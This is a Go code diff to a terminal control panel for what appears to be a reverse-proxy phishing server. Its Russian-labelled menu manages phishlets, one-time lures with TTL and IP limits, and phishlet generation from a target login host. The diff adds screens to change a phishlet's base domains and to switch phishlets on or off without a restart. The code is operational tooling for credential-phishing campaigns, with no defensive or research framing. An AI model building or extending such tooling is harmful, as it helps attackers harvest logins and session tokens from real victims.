@@ -37,6 +37,8 @@ const (
 	sLure
 	sReload
 	sGenerate
+	sPhishDomain
+	sPhishToggle
 	sResult
 )
 
@@ -75,6 +77,8 @@ func initialModel(c *Client) model {
 		item{"Smart lure+", "одноразовая приманка с TTL/IP/challenge", sLure},
 		item{"Reload", "hot-reload фишлетов без рестарта", sReload},
 		item{"Generate", "новый фишлет: origin→domain→id", sGenerate},
+		item{"Phishlet domain", "сменить base_domains", sPhishDomain},
+		item{"Phishlet on/off", "вкл/выкл без рестарта", sPhishToggle},
 		item{"Quit", "выход (сервер продолжает работать)", sMenu},
 	}
 	delegate := list.NewDefaultDelegate()
@@ -161,7 +165,8 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 }
 
 func (m model) isForm() bool {
-	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate
+	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate ||
+		m.screen == sPhishDomain || m.screen == sPhishToggle
 }
 
 func (m model) moveFocus(key string) (tea.Model, tea.Cmd) {
@@ -258,6 +263,16 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 				[]string{"origin  (login.x.com)", "domain  (p.test)", "id"},
 				[]string{"", "", ""})
 			m.focus = 0
+		case sPhishDomain:
+			m.inputs, m.labels = mkInputs(
+				[]string{"phishlet id", "domains csv"},
+				[]string{"", ""})
+			m.focus = 0
+		case sPhishToggle:
+			m.inputs, m.labels = mkInputs(
+				[]string{"phishlet id", "on/off y/n"},
+				[]string{"", ""})
+			m.focus = 0
 		}
 		return m, nil
 	}
@@ -287,6 +302,35 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 		}
 		lines := strings.SplitN(yml, "\n", 14)
 		return m.showResult(strings.Join(lines, "\n")+"\n…", false), nil
+	case sPhishDomain:
+		raw := strings.ReplaceAll(m.inputs[1].Value(), " ", ",")
+		var domains []string
+		for _, s := range strings.Split(raw, ",") {
+			if s = strings.TrimSpace(s); s != "" {
+				domains = append(domains, s)
+			}
+		}
+		if m.inputs[0].Value() == "" || len(domains) == 0 {
+			return m.showResult("id + domains required", true), nil
+		}
+		if err := m.client.SetPhishlet(m.inputs[0].Value(), domains, nil); err != nil {
+			return m.showResult("domain: " + err.Error(), true), nil
+		}
+		return m.showResult("domains: " + strings.Join(domains, ", "), false), nil
+	case sPhishToggle:
+		v := strings.ToLower(strings.TrimSpace(m.inputs[1].Value()))
+		on := v == "y" || v == "yes" || v == "1" || v == "on"
+		if m.inputs[0].Value() == "" {
+			return m.showResult("id required", true), nil
+		}
+		if err := m.client.SetPhishlet(m.inputs[0].Value(), nil, &on); err != nil {
+			return m.showResult("on/off: " + err.Error(), true), nil
+		}
+		state := "off"
+		if on {
+			state = "on"
+		}
+		return m.showResult(m.inputs[0].Value()+" "+state, false), nil
 	}
 	return m, nil
 }
